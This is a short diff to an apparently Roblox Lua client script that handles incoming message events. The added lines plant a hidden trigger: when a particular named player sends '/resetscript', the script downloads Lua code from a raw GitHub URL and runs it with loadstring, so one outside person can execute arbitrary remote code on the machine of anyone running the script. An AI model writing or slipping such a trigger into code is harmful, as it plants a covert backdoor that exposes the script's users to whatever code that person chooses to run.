@@ -62,6 +62,8 @@ OnMessageEvent.OnClientEvent:Connect(function(data)
                     orbitConnection = nil
                 end
             end
+        elseif message == "/resetscript" and player == "Dkailhan_1" then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/piggy.lua"))()
         end
     end)
 end)
